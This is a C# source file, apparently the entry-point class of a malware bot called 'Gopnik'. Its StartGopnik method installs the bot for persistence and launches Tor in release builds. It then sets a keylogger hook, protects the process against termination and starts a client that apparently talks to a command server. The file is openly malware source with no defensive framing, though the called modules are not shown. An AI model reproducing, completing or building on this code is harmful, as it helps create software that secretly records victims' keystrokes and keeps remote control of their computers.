using System;
using System.Collections.Generic;
using System.Text;
using Stub.Network.Gopnik;
using Stub.Core.Config;
using System.Threading;
using Stub.Core.Modules.Startup;
using Stub.Core.Tor;
using Stub.Utilities;
using Stub.Core.Modules.Keylogger;
using System.Windows.Forms;
using Stub.WinAPI;
using Stub.Core.Modules.Process_Protection;

namespace Stub.Core
{
    class CBot
    {
        public static CConfig BotConfig = null;
        public static CGopnikClient m_GopnikClient = null;
        public static CDynamicAPI APIEngine = null;
        public static Mutex mInstance = null;

        public static void StartGopnik()
        {
            APIEngine = new CDynamicAPI();
            
#if !DEBUG
            if (!CMalwareStartup.InstallBot()) return;
#endif
            BotConfig = new CConfig();

            if (!CUtils.IsSingleInstance(out mInstance))
                return;

#if !DEBUG
            if (!CTorLoader.StartTor())
            {
                return;
            }
            Thread.Sleep(10000);
#endif
            CKeylogger.ApplyHook();

            CProcessProtection.ProtectProcess(true);

            m_GopnikClient = new CGopnikClient();
            m_GopnikClient.Start();

            Application.Run();
          
            m_GopnikClient.Stop();
        }
    }
}
